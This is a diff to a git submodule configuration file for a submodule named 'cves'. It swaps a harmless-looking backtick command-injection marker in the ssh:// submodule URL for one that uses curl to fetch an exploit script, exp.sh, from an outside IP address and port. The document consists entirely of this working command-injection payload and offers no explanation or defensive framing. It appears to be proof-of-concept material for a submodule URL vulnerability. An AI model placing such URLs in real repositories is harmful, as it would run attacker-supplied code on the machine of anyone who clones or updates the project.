@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`echo  986bahs  >poc.sh` foo.example.com/bar
+	url = ssh://`curl http://10.100.41.71:12345/exp.sh` foo.example.com/bar
